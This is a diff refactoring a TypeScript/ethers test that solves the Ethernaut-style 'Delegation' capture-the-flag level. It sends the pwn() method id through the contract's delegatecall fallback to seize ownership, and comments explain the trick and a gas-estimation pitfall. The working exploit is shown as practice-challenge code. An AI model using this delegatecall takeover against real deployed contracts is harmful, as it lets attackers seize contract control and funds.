@@ -1,11 +1,7 @@
-import {
-  BigNumber,
-  Contract,
-  ContractTransaction,
-  Signer,
-  utils,
-} from "ethers";
-import { setupTest } from "./utils";
+import { expect } from "chai";
+import { BigNumber, Contract, Signer, utils } from "ethers";
+import { DELEGATION_LEVEL_ADDRESS } from "./constants";
+import { TestOptions, setupChallenge, submitLevel } from "./utils";
 
 /**
  * The Delegation contract has a fallback function that forwards calls to the Delegate contract via `delegatecall`
@@ -14,7 +10,7 @@ import { setupTest } from "./utils";
  *
  * Calling the pwn method via the `delegatecall` will make us the owner of the Delegation contract.
  * In order to do this we need to compute the methodId of the `pwn()` method and pass it in as the msg.data
- * 
+ *
  * FAILED GAS ESTIMATION:
  * The catch about gas estimation is that the node will try out your tx with different gas values, and return the lowest
  * one for which your tx doesn’t fail. But it only looks at your tx, not at any of the internal calls it makes. This
@@ -24,24 +20,29 @@ import { setupTest } from "./utils";
  * @see https://gist.github.com/spalladino/a349f0ca53dbb5fc3914243aaf7ea8c6
  */
 
-let eoa: Signer;
-let challenge: Contract; // challenge contract
+describe("Delegate", () => {
+  let eoa: Signer;
+  let challenge: Contract;
 
-// Setup challenge level instance, eoa, attacker and before/after hooks
-(async () => {
-  const contractLevel = "0x73379d8B82Fda494ee59555f333DF7D44483fD58";
-  const contractName = "Delegation";
-  ({ eoa, challenge } = await setupTest(contractLevel, { contractName }));
-})();
-
-it("solves the challenge", async () => {
-  const tx: ContractTransaction = await eoa.sendTransaction({
-    from: await eoa.getAddress(),
-    to: challenge.address,
-    // pass in the methodId of pwn()
-    data: utils.id("pwn()").substring(0, 10),
-    // need to set gas manually - the gas estimation fails as the inner call does not propagate the error when it runs out of gas
-    gasLimit: BigNumber.from("111111"),
+  before(async () => {
+    const contractLevel = DELEGATION_LEVEL_ADDRESS;
+    const contractName = "Delegation";
+    const options: TestOptions = { contractName };
+    ({ eoa, challenge } = await setupChallenge(contractLevel, options));
   });
-  await tx.wait();
+
+  it("solves the challenge", async () => {
+    await eoa.sendTransaction({
+      from: await eoa.getAddress(),
+      to: challenge.address,
+      // pass in the methodId of pwn()
+      data: utils.id("pwn()").substring(0, 10),
+      // need to set gas manually - the gas estimation fails as the inner call does not propagate the error when it runs out of gas
+      gasLimit: BigNumber.from("111111"),
+    });
+  });
+
+  after(async () => {
+    expect(await submitLevel(challenge.address), "level not solved").to.be.true;
+  });
 });
